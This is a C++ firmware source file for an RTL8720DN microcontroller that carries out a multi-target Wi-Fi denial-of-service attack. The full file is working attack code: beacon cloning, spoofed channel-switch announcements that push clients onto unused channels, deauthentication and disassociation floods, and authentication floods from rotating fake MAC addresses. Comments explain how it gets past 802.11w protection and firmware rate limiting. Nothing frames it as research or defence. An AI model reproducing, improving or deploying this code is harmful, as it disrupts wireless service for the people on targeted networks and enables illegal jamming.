#include "interference.h"
#include "wifi_conf.h"
#include "../../debug.h"

// External AmebaD WiFi functions
extern "C" {
    void wifi_enter_promisc_mode();
}

// ===================================================================
// CONSTANTS & CONFIG
// ===================================================================
// Channels to scatter beacons across (both bands)
static const int adj_channels_24[]  = {1, 6, 11, 2, 3, 4, 5, 7, 8, 9, 10, 12, 13};
static const int adj_channels_5g[]  = {36, 40, 44, 48, 52, 56, 60, 64, 100, 104,
                                        108, 112, 116, 120, 124, 128, 132, 136, 140,
                                        144, 149, 153, 157, 161, 165};
// Ghost channels for CSA vector (forces clients to dead channels)
// FIX #5: Dùng non-DFS channels (UNII-1/3) – client accept ngay, không cần DFS scan
static const uint8_t csa_ghost_24[] = {12, 13, 14};
static const uint8_t csa_ghost_5g[] = {36, 40, 44, 48, 149, 153, 157, 161};

// Reduced fallback timeout → attack starts sooner when beacon not captured
#define CAPTURE_TIMEOUT_MS   2500
// Minimum delay after wext_set_channel for hardware to actually switch
// FIX #4: 5→15ms – RTL8720DN needs ~10-15ms for PLL retuning on band switch
#define CHANNEL_SWITCH_DELAY_MS  15
// Burst rounds per target-channel attack cycle
#define BURST_COUNT          120
// Ratio: how many cycles to spend on target vs. scatter (higher = more focused)
// 9 out of 10 cycles on target, 1 on scatter
#define TARGET_RATIO         9

// ===================================================================
// GLOBAL STATE
// ===================================================================
// Array of targets (multi-target support)
static BeaconClone targets[MAX_INTERFERENCE_TARGETS];
static int         num_targets    = 0;  // How many targets are registered
static int         active_target  = 0;  // Round-robin index

// Per-cycle counters (shared, reset on new attack session)
static uint32_t cycle_counter  = 0;
static int      adj_hop_idx    = 0;
static int      csa_idx        = 0;

// Global MAC counter – declared as a true global so it never resets between
// start_interference() calls. This ensures the auth-flood MACs are always
// different and cannot be filtered by AP firmware that tracks recent MACs.
static uint32_t g_mac_counter  = 0xA5000000;

// ===================================================================
// INTERNAL HELPERS
// ===================================================================

// Build a guaranteed-valid synthetic beacon tag block for a given channel.
// FIX #3: Split 2.4GHz vs 5GHz – 5GHz adds HT/VHT Cap IE, removes ERP Info.
static void _build_synthetic_payload(BeaconClone* t) {
    uint8_t ch = (uint8_t)t->target_channel;
    bool is5GHz = (ch > 14);

    if (is5GHz) {
        // === 5GHz Synthetic Beacon ===
        // Includes HT Capabilities (Tag 45) + VHT Capabilities (Tag 191)
        // ERP Info (Tag 42) intentionally OMITTED – 2.4GHz-only IE
        static const uint8_t tpl_5g[] = {
            0x00, 0x00,                                         // Tag 0:  Hidden SSID
            0x01, 0x08, 0x8C, 0x12, 0x98, 0x24,
                        0xB0, 0x48, 0x60, 0x6C,                // Tag 1:  Supported Rates
            0x03, 0x01, 0x00,                                   // Tag 3:  DS Param (ch filled)
            0x05, 0x04, 0x00, 0x01, 0x00, 0x00,               // Tag 5:  TIM
            0x07, 0x06, 0x55, 0x53, 0x20, 0x24, 0x09, 0x14,  // Tag 7:  Country (US 5GHz)
            0x20, 0x01, 0x00,                                   // Tag 32: Power Constraint
            // Tag 45: HT Capabilities (802.11n) – 26 bytes payload
            0x2D, 0x1A,
            0xEF, 0x09,        // HT Cap Info: LDPC, 40MHz, SGI20, SGI40, TX-STBC
            0x17,              // A-MPDU Params
            0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // MCS Set (stream 0)
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00,        // HT Extended Cap
            0x00, 0x00, 0x00, 0x00,  // Beamforming
            0x00,              // ASEL Cap
            // Tag 191: VHT Capabilities (802.11ac) – 12 bytes payload
            0xBF, 0x0C,
            0x32, 0x50, 0x80, 0x0F,  // VHT Cap Info: 80MHz, SGI80, RX STBC 1
            0xFE, 0xFF, 0x00, 0x00,  // RX MCS Map (MCS 0-9 for 1 stream)
            0xFE, 0xFF, 0x00, 0x00,  // TX MCS Map
        };
        const size_t tpl_len = sizeof(tpl_5g);
        if (t->payload) free(t->payload);
        t->payload = (uint8_t*)malloc(tpl_len);
        if (!t->payload) return;
        memcpy(t->payload, tpl_5g, tpl_len);
        // DS Param channel byte is at index 14 in the tag block
        t->payload[14] = ch;
        t->payload_len  = tpl_len;
    } else {
        // === 2.4GHz Synthetic Beacon (original template) ===
        // Supported rates: 1, 2, 5.5, 11, 6, 9, 12, 18 Mbps
        static const uint8_t tpl_24[] = {
            0x00, 0x00,                                                        // Tag 0:  Hidden SSID
            0x01, 0x08, 0x8C, 0x12, 0x98, 0x24, 0xB0, 0x48, 0x60, 0x6C,   // Tag 1:  Supported Rates
            0x03, 0x01, 0x00,                                                  // Tag 3:  DS Param (ch filled)
            0x05, 0x04, 0x00, 0x01, 0x00, 0x00,                             // Tag 5:  TIM
            0x07, 0x06, 0x55, 0x53, 0x20, 0x01, 0x0B, 0x1E,               // Tag 7:  Country (US 2.4GHz)
            0x2A, 0x01, 0x00,                                                  // Tag 42: ERP Info
            0x32, 0x04, 0x0C, 0x12, 0x18, 0x60                              // Tag 50: Extended Rates
        };
        const size_t tpl_len = sizeof(tpl_24);
        if (t->payload) free(t->payload);
        t->payload = (uint8_t*)malloc(tpl_len);
        if (!t->payload) return;
        memcpy(t->payload, tpl_24, tpl_len);
        t->payload[14] = ch;
        t->payload_len  = tpl_len;
    }
    t->state = INT_STATE_ACTIVE;
}

// Activate synthetic payload fallback for a target and stop its sniffer.
static void _activate_synthetic(BeaconClone* t) {
    _build_synthetic_payload(t);
    if (t->payload) {
        wifi_set_promisc((rtw_rcr_level_t)0, NULL, 0);
        DEBUG_SER_PRINT("[!] INT: Synthetic fallback for CH" + String(t->target_channel) + "\n");
        digitalWrite(LED_G, LOW);
    } else {
        // malloc failed – abort this target
        t->state = INT_STATE_IDLE;
    }
}

// ===================================================================
// SNIFFER CALLBACK
// Captures the real beacon for the FIRST target that is still capturing.
// Only one sniffer is active at a time (hardware limitation).
// ===================================================================
static void _beacon_sniffer_cb(unsigned char* frame, unsigned int len, void* arg) {
    (void)arg;
    if (len < 24) return;

    // Find which target is currently in capturing state
    BeaconClone* t = NULL;
    for (int i = 0; i < num_targets; i++) {
        if (targets[i].state == INT_STATE_CAPTURING) {
            t = &targets[i];
            break;
        }
    }
    if (!t) return;

    // Detect beacon frame and handle radiotap/driver header offsets
    int offset = -1;
    if (frame[0] == 0x80)                       offset = 0;
    else if (len > 40 && frame[4]  == 0x80)     offset = 4;
    else if (len > 44 && frame[8]  == 0x80)     offset = 8;
    else return;

    if (len < (unsigned int)(offset + 36)) return;
    // Filter: only accept beacons from our target BSSID
    if (memcmp(&frame[offset + 16], t->bssid, 6) != 0) return;

    // === CAPTURED ===
    memcpy(&t->beacon_interval, &frame[offset + 32], 2);
    memcpy(&t->capabilities,    &frame[offset + 34], 2);

    size_t tags_len = len - (offset + 36);
    if (tags_len > 400) tags_len = 400;
    if (tags_len == 0)  return;

    if (t->payload) free(t->payload);
    t->payload = (uint8_t*)malloc(tags_len);
    if (t->payload) {
        memcpy(t->payload, &frame[offset + 36], tags_len);
        t->payload_len = tags_len;
        t->state       = INT_STATE_ACTIVE;
        wifi_set_promisc((rtw_rcr_level_t)0, NULL, 0);
        DEBUG_SER_PRINT("[+] INT: REAL beacon captured! CH" + String(t->target_channel) +
                        " Tags=" + String(tags_len) + "B\n");
        digitalWrite(LED_G, LOW);
    }
}

// ===================================================================
// INTERNAL: Start sniffing for a specific target index.
// ===================================================================
static void _start_sniffer_for(int idx) {
    BeaconClone* t = &targets[idx];
    wifi_set_promisc((rtw_rcr_level_t)0, NULL, 0);
    delay(30);
    wifi_enter_promisc_mode();
    delay(80);
    wext_set_channel(WLAN0_NAME, t->target_channel);
    delay(CHANNEL_SWITCH_DELAY_MS * 4);  // Longer settle for capture
    wifi_set_promisc((rtw_rcr_level_t)2, _beacon_sniffer_cb, 0);
    DEBUG_SER_PRINT("[*] INT: Sniffer on CH" + String(t->target_channel) + "\n");
}

// ===================================================================
// INTERNAL: Initialize a BeaconClone entry.
// ===================================================================
static void _init_target(BeaconClone* t, uint8_t* bssid, int channel) {
    if (t->payload) { free(t->payload); t->payload = NULL; }
    memcpy(t->bssid, bssid, 6);
    t->target_channel = channel;
    t->payload_len    = 0;
    t->start_time     = millis();
    t->state          = INT_STATE_CAPTURING;
    t->beacon_interval = 0x64;
    t->capabilities    = 0x0411;
}

// ===================================================================
// PUBLIC API: Single-target (backward compatible)
// ===================================================================
void start_interference(uint8_t* target_bssid, int channel) {
    // Reset all targets
    for (int i = 0; i < MAX_INTERFERENCE_TARGETS; i++) {
        if (targets[i].payload) { free(targets[i].payload); targets[i].payload = NULL; }
        targets[i].state = INT_STATE_IDLE;
    }
    num_targets  = 1;
    active_target = 0;
    cycle_counter = 0;
    adj_hop_idx   = 0;
    csa_idx       = 0;

    _init_target(&targets[0], target_bssid, channel);

    DEBUG_SER_PRINT("[*] INT[0]: BSSID=");
    for (int i = 0; i < 6; i++) {
        if (target_bssid[i] < 16) DEBUG_SER_PRINT("0");
        DEBUG_SER_PRINT(String(target_bssid[i], HEX) + (i < 5 ? ":" : ""));
    }
    DEBUG_SER_PRINT(" CH=" + String(channel) + "\n");

    _start_sniffer_for(0);
    digitalWrite(LED_G, HIGH);
}

// ===================================================================
// PUBLIC API: Multi-target — call this first to reset state
// ===================================================================
void start_interference_multi() {
    for (int i = 0; i < MAX_INTERFERENCE_TARGETS; i++) {
        if (targets[i].payload) { free(targets[i].payload); targets[i].payload = NULL; }
        targets[i].state = INT_STATE_IDLE;
    }
    num_targets   = 0;
    active_target = 0;
    cycle_counter = 0;
    adj_hop_idx   = 0;
    csa_idx       = 0;
    DEBUG_SER_PRINT("[*] INT: Multi-target session initialized.\n");
}

// ===================================================================
// PUBLIC API: Add one target to the multi-target session.
// Returns true if added, false if array is full.
// ===================================================================
bool add_interference_target(uint8_t* target_bssid, int channel) {
    if (num_targets >= MAX_INTERFERENCE_TARGETS) {
        DEBUG_SER_PRINT("[!] INT: Target list full (" + String(MAX_INTERFERENCE_TARGETS) + " max)\n");
        return false;
    }

    int idx = num_targets;
    _init_target(&targets[idx], target_bssid, channel);
    num_targets++;

    DEBUG_SER_PRINT("[*] INT[" + String(idx) + "]: Added BSSID=");
    for (int i = 0; i < 6; i++) {
        if (target_bssid[i] < 16) DEBUG_SER_PRINT("0");
        DEBUG_SER_PRINT(String(target_bssid[i], HEX) + (i < 5 ? ":" : ""));
    }
    DEBUG_SER_PRINT(" CH=" + String(channel) + "\n");

    // Start sniffer on the first added target
    if (idx == 0) {
        _start_sniffer_for(0);
        digitalWrite(LED_G, HIGH);
    } else {
        // Subsequent targets get synthetic payloads immediately
        // (only one sniffer can run at a time; we prioritize capturing target 0)
        _build_synthetic_payload(&targets[idx]);
        DEBUG_SER_PRINT("[*] INT[" + String(idx) + "]: Using synthetic payload.\n");
    }
    return true;
}

// ===================================================================
// PUBLIC API: Stop all interference
// ===================================================================
void stop_interference() {
    for (int i = 0; i < MAX_INTERFERENCE_TARGETS; i++) {
        targets[i].state = INT_STATE_IDLE;
        if (targets[i].payload) { free(targets[i].payload); targets[i].payload = NULL; }
        targets[i].payload_len = 0;
    }
    num_targets = 0;
    wifi_set_promisc((rtw_rcr_level_t)0, NULL, 0);
    digitalWrite(LED_B, LOW);
    digitalWrite(LED_G, LOW);
    digitalWrite(LED_R, HIGH);
    DEBUG_SER_PRINT("[*] INT: Stopped.\n");
}

// ===================================================================
// INTERNAL: Execute one full attack burst on a single target
// ===================================================================
static void _attack_target(BeaconClone* t) {
    bool is5GHz = (t->target_channel > 14);

    // Switch to target channel and wait for hardware to settle
    wext_set_channel(WLAN0_NAME, t->target_channel);
    delay(CHANNEL_SWITCH_DELAY_MS);

    uint8_t* bssid  = t->bssid;
    uint8_t  bcast[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

    // Rotate reason codes per cycle to bypass firmware-side rate limiting
    static const uint16_t reasons[] = {1, 4, 6, 7, 8, 2, 3, 9};
    uint16_t reason = reasons[cycle_counter % (sizeof(reasons)/sizeof(reasons[0]))];

    for (int burst = 0; burst < BURST_COUNT; burst++) {
        // --- Advance global MAC counter (never predictable across sessions) ---
        g_mac_counter += 0x00000137;  // Prime step to avoid MAC patterns
        uint8_t rand_mac[6] = {
            0x02,
            (uint8_t)(g_mac_counter >> 16),
            (uint8_t)(g_mac_counter >> 8),
            (uint8_t)(g_mac_counter),
            (uint8_t)(burst ^ 0xA5),
            0xBB
        };

        // [1] NAV Saturation – locks airtime for all other stations
        wifi_tx_deauth_nav(bssid, bcast, reason);

        // [2] CSA Attack
        {
            uint8_t ghost_ch;
            if (is5GHz) {
                ghost_ch = csa_ghost_5g[csa_idx % sizeof(csa_ghost_5g)];
            } else {
                ghost_ch = csa_ghost_24[csa_idx % sizeof(csa_ghost_24)];
            }
            csa_idx++;
            // FIX #2: Dùng Beacon-embedded CSA cho 5GHz thay vì Action Frame
            // Beacon frames KHÔNG bị PMF (802.11w) bảo vệ → bypass được
            // Action Frame CSA (wifi_tx_csa_frame) bị PMF chặn trên WPA3/802.11w networks
            wifi_tx_beacon_csa_frame(bssid, bcast, "", ghost_ch);
            wifi_tx_beacon_csa_frame(bssid, bcast, "", ghost_ch); // Send twice
        }

        // [3] Forward Deauth  (AP → All Clients)
        wifi_tx_deauth_frame(bssid, bcast, reason);

        // [4] Reverse Deauth  (Fake Client → AP) – FIX #1: truyền bssid để access_point đúng
        wifi_tx_deauth_frame(rand_mac, bssid, reason, bssid);

        // [5] Forward Disassoc (AP → All Clients)
        wifi_tx_disassoc_frame(bssid, bcast, reason);

        // [6] Reverse Disassoc (Fake Client → AP) – FIX #1: truyền bssid
        wifi_tx_disassoc_frame(rand_mac, bssid, reason, bssid);

        // [7] Auth Flood – exhaust AP association table (3× per burst)
        wifi_tx_auth_frame(rand_mac, bssid);
        wifi_tx_auth_frame(rand_mac, bssid);
        wifi_tx_auth_frame(rand_mac, bssid);

        // [8] Beacon Clone – adds RF noise on channel; confuses client scanning
        if (t->payload && t->payload_len > 0) {
            wifi_tx_raw_beacon(bssid, bcast,
                               t->payload, t->payload_len,
                               t->beacon_interval, t->capabilities);
        }

        // RTOS yield: feed WDT every 15 iterations
        if (burst % 15 == 0) {
            delay(1);
        }
    }
}

// ===================================================================
// INTERNAL: Scatter beacon on an adjacent channel (airtime disruption)
// ===================================================================
static void _scatter_adjacent(BeaconClone* t) {
    bool is5GHz = (t->target_channel > 14);
    int adj_ch;
    if (is5GHz) {
        adj_ch = adj_channels_5g[adj_hop_idx % (sizeof(adj_channels_5g)/sizeof(adj_channels_5g[0]))];
    } else {
        adj_ch = adj_channels_24[adj_hop_idx % (sizeof(adj_channels_24)/sizeof(adj_channels_24[0]))];
    }
    adj_hop_idx++;

    if (wext_set_channel(WLAN0_NAME, adj_ch) >= 0) {
        delay(CHANNEL_SWITCH_DELAY_MS);
        // 8 beacons per scatter pass (up from 5) for better coverage
        for (int i = 0; i < 8; i++) {
            if (t->payload && t->payload_len > 0) {
                wifi_tx_raw_beacon(t->bssid, (uint8_t*)"\xFF\xFF\xFF\xFF\xFF\xFF",
                                   t->payload, t->payload_len,
                                   t->beacon_interval, t->capabilities);
            }
        }
        delay(1);
    }
}

// ===================================================================
// PUBLIC API: Main loop tick — call this repeatedly from loop()
// ===================================================================
void run_interference_cycle() {
    if (num_targets == 0) return;

    // --- Handle any target still in CAPTURING state ---
    for (int i = 0; i < num_targets; i++) {
        if (targets[i].state == INT_STATE_CAPTURING) {
            uint32_t elapsed = millis() - targets[i].start_time;
            if (elapsed > CAPTURE_TIMEOUT_MS) {
                // Timeout → use synthetic payload and keep attacking
                _activate_synthetic(&targets[i]);
                DEBUG_SER_PRINT("[!] INT[" + String(i) + "]: Timeout, using synthetic.\n");
            } else {
                // Still waiting for real beacon – blink LED and yield
                static uint32_t last_blink = 0;
                if (millis() - last_blink > 150) {
                    digitalWrite(LED_G, !digitalRead(LED_G));
                    last_blink = millis();
                }
                delay(5);
                return;  // Don't attack while any target is still capturing
            }
        }
    }

    // --- All targets are ACTIVE or IDLE, pick next one round-robin ---
    // Skip IDLE targets (if removed or failed)
    int start = active_target;
    do {
        active_target = (active_target + 1) % num_targets;
        if (targets[active_target].state == INT_STATE_ACTIVE) break;
    } while (active_target != start);

    BeaconClone* t = &targets[active_target];
    if (t->state != INT_STATE_ACTIVE) return;  // No active targets at all

    // Ensure payload is valid
    if (!t->payload || t->payload_len == 0) {
        _build_synthetic_payload(t);
        if (!t->payload) { t->state = INT_STATE_IDLE; return; }
    }

    // --- LED heartbeat ---
    static uint32_t last_led = 0;
    if (millis() - last_led > 50) {
        digitalWrite(LED_B, !digitalRead(LED_B));
        last_led = millis();
    }

    cycle_counter++;

    // Decision: TARGET_RATIO cycles on target, 1 cycle on scatter
    if (cycle_counter % (TARGET_RATIO + 1) < TARGET_RATIO) {
        _attack_target(t);
    } else {
        _scatter_adjacent(t);
    }
}

// ===================================================================
// PUBLIC API: Getters
// ===================================================================
interference_state_t get_interference_state() {
    // Return the "worst" state (CAPTURING > ACTIVE > IDLE)
    for (int i = 0; i < num_targets; i++) {
        if (targets[i].state == INT_STATE_CAPTURING) return INT_STATE_CAPTURING;
    }
    for (int i = 0; i < num_targets; i++) {
        if (targets[i].state == INT_STATE_ACTIVE) return INT_STATE_ACTIVE;
    }
    return INT_STATE_IDLE;
}

bool is_captured() {
    for (int i = 0; i < num_targets; i++) {
        if (targets[i].state == INT_STATE_ACTIVE) return true;
    }
    return false;
}

int get_active_target_count() {
    int count = 0;
    for (int i = 0; i < num_targets; i++) {
        if (targets[i].state == INT_STATE_ACTIVE) count++;
    }
    return count;
}
